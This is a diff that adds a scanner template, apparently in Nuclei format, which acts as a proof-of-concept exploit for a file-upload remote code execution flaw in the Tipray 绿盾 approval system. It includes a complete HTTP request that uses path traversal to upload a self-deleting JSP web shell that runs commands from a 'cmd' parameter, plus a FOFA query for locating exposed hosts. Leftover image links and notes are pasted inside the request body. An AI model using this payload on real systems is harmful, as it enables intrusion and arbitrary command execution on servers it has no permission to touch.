@@ -1,0 +1,65 @@
+id: poc-wrbwwc93rr0a6307
+info:
+  name: 天锐绿盾审批系统 addUpFile.do 存在文件上传致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wrbwwc93rr0a6307'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wrbwwc93rr0a6307
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'POST /trwfe/service/.%2E/file/addUpFile.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+    Content-Disposition: form-data; name="relativepath"
+
+
+    ../../webapps/ROOT/c
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+    Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1
+
+    Content-Disposition: form-data; name="taskId"
+
+
+    123456
+
+    ------WebKitFormBoundaryJ89XK7WxiQuU7uq1--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944151633-4e4c62b8-9a14-440d-a6b5-7c97ada383f5.png)
+
+    PS：回显必须是true，文件会上传到根目录
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944151917-fc170309-f7d7-4cb4-852c-0dcc75ec25ca.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
